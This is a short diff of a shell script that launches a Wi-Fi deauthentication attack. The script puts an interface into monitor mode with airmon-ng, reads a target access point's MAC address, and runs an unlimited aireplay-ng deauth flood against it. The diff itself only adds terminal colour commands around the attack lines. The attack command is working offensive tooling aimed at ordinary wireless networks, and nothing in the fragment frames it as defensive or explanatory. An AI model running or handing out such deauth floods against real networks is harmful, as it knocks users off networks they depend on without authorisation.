@@ -52,6 +52,8 @@ sudo airmon-ng start $inter $chan > nul
 echo "MAC of Access-Points:"
 read macacc
 echo "loading attack..."
+tput setaf 1
 sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
 sudo airmon-ng stop $inter\mon > nul
+tput sgr0
 exit 0
